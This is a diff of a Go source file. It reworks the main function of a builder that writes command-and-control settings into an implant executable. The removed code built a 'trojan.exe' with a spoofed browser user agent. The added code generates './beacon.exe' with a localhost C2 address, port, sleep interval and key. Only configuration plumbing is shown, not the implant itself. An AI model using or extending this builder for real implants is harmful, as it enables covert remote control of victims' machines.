@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"fmt"
 	"io/ioutil"
 	"strconv"
 )
@@ -43,7 +44,6 @@ func GenerateOblivionis(config OblivionisConfig, path string) {
 	ioutil.WriteFile(path, blank, 0644)
 }
 
-/*
 func hexDump(arr []uint8) {
 	i := 0
 	for i < len(arr) {
@@ -61,29 +61,24 @@ func hexDump(arr []uint8) {
 		i += 1
 	}
 }
-
-
-func main() {
-	encrypt_a := make([]uint8, 16)
+func temp_a() []uint8 {
+	a := make([]uint8, 16)
 	i := 0
 	for i < 16 {
-		encrypt_a[i] = (uint8)(41 + i*2)
-		i += 1
+		a[i] = (uint8)(0x41 + i*2)
+		i++
 	}
-	cfg := OblivionisConfig{
-		c2addr:    "127.0.0.1",
-		c2port:    8080,
-		useragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
-		url:       "admin.php",
-		host:      "localhost",
-		sleep:     500,
-		a:         encrypt_a,
-	}
-	fmt.Println("key = ")
-	hexDump(encrypt_a)
-	fmt.Println("\nconfig data = ")
-	configData := cfg.toData()
-	hexDump(configData)
-	GenerateOblivionis(cfg, "trojan.exe")
+	return a
 }
-*/
+
+func main() {
+	var config OblivionisConfig
+	config.c2addr = "127.0.0.1"
+	config.c2port = 8080
+	config.useragent = "Value1"
+	config.a = temp_a()
+	config.url = ""
+	config.sleep = 1
+	config.host = "testhost"
+	GenerateOblivionis(config, "./beacon.exe")
+}
